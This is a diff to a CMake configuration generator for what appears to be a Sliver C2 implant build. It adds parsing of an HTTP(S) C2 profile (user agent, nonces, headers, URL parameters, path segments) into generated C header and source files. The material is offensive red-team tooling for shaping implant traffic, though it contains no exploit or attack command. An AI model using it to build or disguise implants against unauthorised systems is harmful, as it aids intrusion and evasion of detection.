@@ -36,6 +36,26 @@ function(_cfg_get_n out parent key default)
   endif()
 endfunction()
 
+# Array element getter: _cfg_get_ix(out parent key index default)
+function(_cfg_get_ix out parent key index default)
+  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${parent}" "${key}" "${index}")
+  if(_err)
+    set(${out} "${default}" PARENT_SCOPE)
+  else()
+    set(${out} "${_v}" PARENT_SCOPE)
+  endif()
+endfunction()
+
+# Array element field getter: _cfg_get_n_ix(out parent key index name default)
+function(_cfg_get_n_ix out parent key index name default)
+  string(JSON _v ERROR_VARIABLE _err GET "${_json}" "${parent}" "${key}" "${index}" "${name}")
+  if(_err)
+    set(${out} "${default}" PARENT_SCOPE)
+  else()
+    set(${out} "${_v}" PARENT_SCOPE)
+  endif()
+endfunction()
+
 # Escape a value so it can be embedded in a C string literal (PEM blocks,
 # JSON fragments, backslashes).
 function(_c_escape out input)
@@ -140,6 +160,110 @@ if(DEBUG_LOG)
 endif()
 
 # ---------------------------------------------------------------------------
+# HTTP(S) C2 profile. The server always writes the "http" object (see
+# server/cppbuild/config.go buildHTTPProfile), but a build may legitimately have
+# no HTTP transport at all, so treat it as optional and emit an empty profile.
+set(SLIVER_HTTP_PRESENT    0)
+set(SLIVER_HTTP_UA         "")
+set(SLIVER_HTTP_NONCE      "")
+set(SLIVER_HTTP_NONCELEN   0)
+set(SLIVER_HTTP_NONCEMODE  "")
+set(SLIVER_HTTP_MINPATH    0)
+set(SLIVER_HTTP_MAXPATH    0)
+set(SLIVER_HTTP_MINFGEN    0)
+set(SLIVER_HTTP_MAXFGEN    0)
+set(_http_header_body      "")
+set(_http_header_count     0)
+set(_http_urlparam_body    "")
+set(_http_urlparam_count   0)
+set(_http_ext_body         "")
+set(_http_ext_count        0)
+set(_http_seg_body         "")
+set(_http_seg_count        0)
+
+string(JSON _http_type ERROR_VARIABLE _http_err TYPE "${_json}" http)
+if(NOT _http_err AND NOT _http_type STREQUAL "NULL")
+  set(SLIVER_HTTP_PRESENT 1)
+  _cfg_get_n(SLIVER_HTTP_UA        http user_agent              "")
+  _cfg_get_n(SLIVER_HTTP_NONCE     http nonce_query_arg_chars   "")
+  _cfg_get_n(SLIVER_HTTP_NONCELEN  http nonce_query_arg_length  "0")
+  _cfg_get_n(SLIVER_HTTP_NONCEMODE http nonce_mode              "")
+  _cfg_get_n(SLIVER_HTTP_MINPATH   http min_path_length         "0")
+  _cfg_get_n(SLIVER_HTTP_MAXPATH   http max_path_length         "0")
+  _cfg_get_n(SLIVER_HTTP_MINFGEN   http min_file_gen            "0")
+  _cfg_get_n(SLIVER_HTTP_MAXFGEN   http max_file_gen            "0")
+  _c_escape(SLIVER_HTTP_UA        "${SLIVER_HTTP_UA}")
+  _c_escape(SLIVER_HTTP_NONCE     "${SLIVER_HTTP_NONCE}")
+  _c_escape(SLIVER_HTTP_NONCEMODE "${SLIVER_HTTP_NONCEMODE}")
+
+  string(JSON _http_header_count ERROR_VARIABLE _e LENGTH "${_json}" http headers)
+  if(NOT _e AND _http_header_count GREATER 0)
+    math(EXPR _hlast "${_http_header_count} - 1")
+    foreach(_i RANGE ${_hlast})
+      _cfg_get_n_ix(_hm http headers ${_i} method      "")
+      _cfg_get_n_ix(_hn http headers ${_i} name        "")
+      _cfg_get_n_ix(_hv http headers ${_i} value       "")
+      _cfg_get_n_ix(_hp http headers ${_i} probability "0")
+      _c_escape(_hm "${_hm}")
+      _c_escape(_hn "${_hn}")
+      _c_escape(_hv "${_hv}")
+      string(APPEND _http_header_body
+        "  {\"${_hm}\", \"${_hn}\", \"${_hv}\", ${_hp}},\n")
+    endforeach()
+  else()
+    set(_http_header_count 0)
+  endif()
+
+  string(JSON _http_urlparam_count ERROR_VARIABLE _e LENGTH "${_json}" http url_parameters)
+  if(NOT _e AND _http_urlparam_count GREATER 0)
+    math(EXPR _ulast "${_http_urlparam_count} - 1")
+    foreach(_i RANGE ${_ulast})
+      _cfg_get_n_ix(_um http url_parameters ${_i} method      "")
+      _cfg_get_n_ix(_un http url_parameters ${_i} name        "")
+      _cfg_get_n_ix(_uv http url_parameters ${_i} value       "")
+      _cfg_get_n_ix(_up http url_parameters ${_i} probability "0")
+      _c_escape(_um "${_um}")
+      _c_escape(_un "${_un}")
+      _c_escape(_uv "${_uv}")
+      string(APPEND _http_urlparam_body
+        "  {\"${_um}\", \"${_un}\", \"${_uv}\", ${_up}},\n")
+    endforeach()
+  else()
+    set(_http_urlparam_count 0)
+  endif()
+
+  string(JSON _http_ext_count ERROR_VARIABLE _e LENGTH "${_json}" http extensions)
+  if(NOT _e AND _http_ext_count GREATER 0)
+    math(EXPR _elast "${_http_ext_count} - 1")
+    foreach(_i RANGE ${_elast})
+      _cfg_get_ix(_ev http extensions ${_i} "")
+      _c_escape(_ev "${_ev}")
+      string(APPEND _http_ext_body "  \"${_ev}\",\n")
+    endforeach()
+  else()
+    set(_http_ext_count 0)
+  endif()
+
+  string(JSON _http_seg_count ERROR_VARIABLE _e LENGTH "${_json}" http path_segments)
+  if(NOT _e AND _http_seg_count GREATER 0)
+    math(EXPR _slast "${_http_seg_count} - 1")
+    foreach(_i RANGE ${_slast})
+      _cfg_get_n_ix(_si http path_segments ${_i} is_file "false")
+      _cfg_get_n_ix(_sv http path_segments ${_i} value   "")
+      if(_si STREQUAL "true" OR _si STREQUAL "ON" OR _si STREQUAL "1")
+        set(_sib 1)
+      else()
+        set(_sib 0)
+      endif()
+      _c_escape(_sv "${_sv}")
+      string(APPEND _http_seg_body "  {${_sib}, \"${_sv}\"},\n")
+    endforeach()
+  else()
+    set(_http_seg_count 0)
+  endif()
+endif()
+
+# ---------------------------------------------------------------------------
 file(WRITE "${OUT_DIR}/implant_build_config.h"
 "/* Auto-generated by cmake/SliverConfigGen.cmake - do not edit. */
 #ifndef SLIVER_BUILD_CONFIG_H
@@ -173,7 +297,46 @@ file(WRITE "${OUT_DIR}/implant_build_config.h"
 
 #define SLIVER_DEBUG_LOG ${_debug}
 
+/* HTTP(S) C2 profile (see sliver/config.h). Arrays live in implant_http_c2.c. */
+#define SLIVER_HTTP_C2_PRESENT       ${SLIVER_HTTP_PRESENT}
+#define SLIVER_HTTP_UA               \"${SLIVER_HTTP_UA}\"
+#define SLIVER_HTTP_NONCE_CHARS      \"${SLIVER_HTTP_NONCE}\"
+#define SLIVER_HTTP_NONCE_LEN        ${SLIVER_HTTP_NONCELEN}
+#define SLIVER_HTTP_NONCE_MODE       \"${SLIVER_HTTP_NONCEMODE}\"
+#define SLIVER_HTTP_MIN_PATH_LENGTH  ${SLIVER_HTTP_MINPATH}
+#define SLIVER_HTTP_MAX_PATH_LENGTH  ${SLIVER_HTTP_MAXPATH}
+#define SLIVER_HTTP_MIN_FILE_GEN     ${SLIVER_HTTP_MINFGEN}
+#define SLIVER_HTTP_MAX_FILE_GEN     ${SLIVER_HTTP_MAXFGEN}
+#define SLIVER_HTTP_HEADER_COUNT     ${_http_header_count}
+#define SLIVER_HTTP_URLPARAM_COUNT   ${_http_urlparam_count}
+#define SLIVER_HTTP_EXTENSION_COUNT  ${_http_ext_count}
+#define SLIVER_HTTP_PATH_SEG_COUNT   ${_http_seg_count}
+
 #endif /* SLIVER_BUILD_CONFIG_H */
+")
+
+# HTTP profile data arrays. Kept in their own TU (mirroring implant_secrets.c) so
+# the header stays declaration-only and can be included from multiple places.
+file(WRITE "${OUT_DIR}/implant_http_c2.c"
+"/* Auto-generated by cmake/SliverConfigGen.cmake - do not edit. */
+#include <stddef.h>
+#include \"sliver/config.h\"
+
+const sliver_http_header_t sliver_http_headers[] = {
+${_http_header_body}  {(const char *)NULL, (const char *)NULL, (const char *)NULL, 0}};
+const size_t sliver_http_header_count = (size_t)${_http_header_count};
+
+const sliver_http_header_t sliver_http_url_parameters[] = {
+${_http_urlparam_body}  {(const char *)NULL, (const char *)NULL, (const char *)NULL, 0}};
+const size_t sliver_http_url_parameter_count = (size_t)${_http_urlparam_count};
+
+const char *const sliver_http_extensions[] = {
+${_http_ext_body}  (const char *)NULL};
+const size_t sliver_http_extension_count = (size_t)${_http_ext_count};
+
+const sliver_http_path_seg_t sliver_http_path_segments[] = {
+${_http_seg_body}  {0, (const char *)NULL}};
+const size_t sliver_http_path_segment_count = (size_t)${_http_seg_count};
 ")
 
 file(WRITE "${OUT_DIR}/implant_secrets.c"
@@ -197,4 +360,4 @@ const char *const sliver_implant_name = \"${SLIVER_NAME}\";
 const char *const sliver_build_id_string = \"${SLIVER_BUILD_ID}\";
 ")
 
-message(STATUS "generated implant_build_config.h + implant_secrets.c in ${OUT_DIR}")
+message(STATUS "generated implant_build_config.h, implant_secrets.c and implant_http_c2.c in ${OUT_DIR}")
